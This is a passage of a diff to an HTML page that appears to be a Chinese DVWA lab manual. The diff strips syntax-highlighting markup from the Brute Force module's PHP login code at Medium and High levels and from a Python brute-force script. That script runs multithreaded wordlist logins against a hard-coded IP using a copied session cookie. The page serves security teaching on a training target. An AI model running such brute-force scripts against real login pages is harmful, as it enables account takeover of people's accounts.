+    server = (&#39;124.70.137.227&#39;,80,)
+    headers = {
+        &#39;Cookie&#39; : &#39;security=low; PHPSESSID=atp0ssp267g2cgum8rvndgr855&#39;
+    }
+    main(server,headers)
+</code></pre>
 <p>使用：</p>
 <ul>
 <li>从浏览器中复制Brute Force模块登录请求中的cookie信息</li>
@@ -746,41 +745,41 @@ BASE_DIR <span class="token operator">=</span> os<span class="token punctuation"
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Medium.png" alt="SecurityLevel_Medium"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<pre><code class="php">&lt;?php
 
-<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token comment" spellcheck="true">// Sanitise username input</span>
-    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'username'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$user</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+if( isset( $_GET[ &#39;Login&#39; ] ) ) {
+    // Sanitise username input
+    $user = $_GET[ &#39;username&#39; ];
+    $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
 
-    <span class="token comment" spellcheck="true">// Sanitise password input</span>
-    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Sanitise password input
+    $pass = $_GET[ &#39;password&#39; ];
+    $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $pass = md5( $pass );
 
-    <span class="token comment" spellcheck="true">// Check the database</span>
-    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span><span class="token punctuation">;</span>
-    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Check the database
+    $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
 
-    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token comment" spellcheck="true">// Get users details</span>
-        <span class="token variable">$row</span>    <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$avatar</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {
+        // Get users details
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row[&quot;avatar&quot;];
 
-        <span class="token comment" spellcheck="true">// Login successful</span>
-        <span class="token keyword">echo</span> <span class="token string">"&lt;p>Welcome to the password protected area {$user}&lt;/p>"</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token string">"&lt;img src=\"{$avatar}\" />"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token comment" spellcheck="true">// Login failed</span>
-        <span class="token function">sleep</span><span class="token punctuation">(</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
+        // Login successful
+        echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;;
+        echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;;
+    }
+    else {
+        // Login failed
+        sleep( 2 );
+        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;
+    }
 
-    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
 
-<span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt; </code></pre>
 <p>说明：        </p>
 <ul>
 <li>相比Low级别的代码，Medium级别的代码主要增加了<strong>mysql_real_escape_string</strong>函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，<font color="blue">在代码第6行和第10行分别对user和password进行转义</font>，<strong>基本上</strong>能够抵御sql注入攻击，说基本上是因为查到说 MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义[^【2】]；</li>
@@ -824,59 +823,59 @@ BASE_DIR <span class="token operator">=</span> os<span class="token punctuation"
 </li>
 </ul>
 <p><strong>方法三：自编Python脚本暴力破解</strong></p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Version: python3</span>
-<span class="token comment" spellcheck="true"># Author: Silence</span>
-<span class="token comment" spellcheck="true"># Encoding: utf-8</span>
+<pre><code class="python"># Version: python3
+# Author: Silence
+# Encoding: utf-8
 
-<span class="token keyword">import</span> os
-<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>thread <span class="token keyword">import</span> ThreadPoolExecutor
-<span class="token keyword">import</span> itertools
+import os
+from concurrent.futures.thread import ThreadPoolExecutor
+import itertools
 
-<span class="token keyword">import</span> requests
+import requests
 
-WORKERS <span class="token operator">=</span> <span class="token number">50</span>
+WORKERS = 50
 
-BASE_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-<span class="token keyword">def</span> <span class="token function">read_file</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">with</span> open<span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fhandler<span class="token punctuation">:</span>
-        <span class="token keyword">yield</span> <span class="token keyword">from</span> fhandler
+def read_file(path):
+    with open(path,&#39;r&#39;) as fhandler:
+        yield from fhandler
 
-<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    addr<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">,</span>headers <span class="token operator">=</span> data
-    username<span class="token punctuation">,</span>password <span class="token operator">=</span> username<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>password<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+def brute_force(data):
+    addr,username,password,headers = data
+    username,password = username.strip(),password.strip()
 
-    url <span class="token operator">=</span> <span class="token string">'http://{0}:{1}/dvwa/vulnerabilities/brute/'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token operator">*</span>addr<span class="token punctuation">)</span>
-    params <span class="token operator">=</span> <span class="token punctuation">{</span>
-        <span class="token string">'username'</span> <span class="token punctuation">:</span> username<span class="token punctuation">,</span>
-        <span class="token string">'password'</span> <span class="token punctuation">:</span> password<span class="token punctuation">,</span>
-        <span class="token string">'Login'</span> <span class="token punctuation">:</span> <span class="token string">'Login'</span>
-    <span class="token punctuation">}</span>
+    url = &#39;http://{0}:{1}/dvwa/vulnerabilities/brute/&#39;.format(*addr)
+    params = {
+        &#39;username&#39; : username,
+        &#39;password&#39; : password,
+        &#39;Login&#39; : &#39;Login&#39;
+    }
 
-    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-    <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok <span class="token operator">and</span> \
-        response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'Welcome to the password protected area'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password
-    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password
+    response = requests.get(url,params,headers=headers)
+    if response.ok and \
+        response.text.find(&#39;Welcome to the password protected area&#39;) != -1:
+        return True,username,password
+    return False,username,password
 
-<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    usernames <span class="token operator">=</span> read_file<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>BASE_DIR<span class="token punctuation">,</span><span class="token string">'username.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    passwords <span class="token operator">=</span> read_file<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>BASE_DIR<span class="token punctuation">,</span><span class="token string">'password.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    datas <span class="token operator">=</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">,</span>usernames<span class="token punctuation">,</span>passwords<span class="token punctuation">,</span><span class="token punctuation">[</span>headers<span class="token punctuation">]</span><span class="token punctuation">)</span>
+def main(addr,headers):
+    usernames = read_file(os.path.join(BASE_DIR,&#39;username.txt&#39;))
+    passwords = read_file(os.path.join(BASE_DIR,&#39;password.txt&#39;))
+    datas = itertools.product([addr],usernames,passwords,[headers])
 
-    executor <span class="token operator">=</span> ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span>WORKERS<span class="token punctuation">)</span>
-    <span class="token keyword">for</span> success<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">in</span> executor<span class="token punctuation">.</span>map<span class="token punctuation">(</span>brute_force<span class="token punctuation">,</span>datas<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> success<span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span>
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span>
+    executor = ThreadPoolExecutor(max_workers=WORKERS)
+    for success,username,password in executor.map(brute_force,datas):
+        if success:
+            print(&#39;+&#39;,username,password)
+        else:
+            print(&#39;-&#39;,username,password)
 
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    server <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'124.70.137.227'</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token punctuation">)</span>
-    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
-        <span class="token string">'Cookie'</span> <span class="token punctuation">:</span> <span class="token string">'security=low; PHPSESSID=atp0ssp267g2cgum8rvndgr855'</span>
-    <span class="token punctuation">}</span>
-    main<span class="token punctuation">(</span>server<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+if __name__ == &#39;__main__&#39;:
+    server = (&#39;124.70.137.227&#39;,80,)
+    headers = {
+        &#39;Cookie&#39; : &#39;security=low; PHPSESSID=atp0ssp267g2cgum8rvndgr855&#39;
+    }
+    main(server,headers)</code></pre>
 <p>使用：</p>
 <ul>
 <li>从浏览器中复制Brute Force模块登录请求中的cookie信息</li>
@@ -897,49 +896,49 @@ BASE_DIR <span class="token operator">=</span> os<span class="token punctuation"
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_High.png" alt="SecurityLevel_High"></center>
 
 <p><strong>服务器端核心代码</strong>：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<pre><code class="php">&lt;?php
 
-<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token comment" spellcheck="true">// Check Anti-CSRF token</span>
-    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+if( isset( $_GET[ &#39;Login&#39; ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
 
-    <span class="token comment" spellcheck="true">// Sanitise username input</span>
-    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'username'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$user</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$user</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Sanitise username input
+    $user = $_GET[ &#39;username&#39; ];
+    $user = stripslashes( $user );
+    $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
 
-    <span class="token comment" spellcheck="true">// Sanitise password input</span>
-    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'password'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Sanitise password input
+    $pass = $_GET[ &#39;password&#39; ];
+    $pass = stripslashes( $pass );
+    $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $pass = md5( $pass );
 
-    <span class="token comment" spellcheck="true">// Check database</span>
-    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span><span class="token punctuation">;</span>
-    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Check database
+    $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
 
-    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token comment" spellcheck="true">// Get users details</span>
-        <span class="token variable">$row</span>    <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$avatar</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) {
+        // Get users details
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row[&quot;avatar&quot;];
 
-        <span class="token comment" spellcheck="true">// Login successful</span>
-        <span class="token keyword">echo</span> <span class="token string">"&lt;p>Welcome to the password protected area {$user}&lt;/p>"</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token string">"&lt;img src=\"{$avatar}\" />"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token comment" spellcheck="true">// Login failed</span>
-        <span class="token function">sleep</span><span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
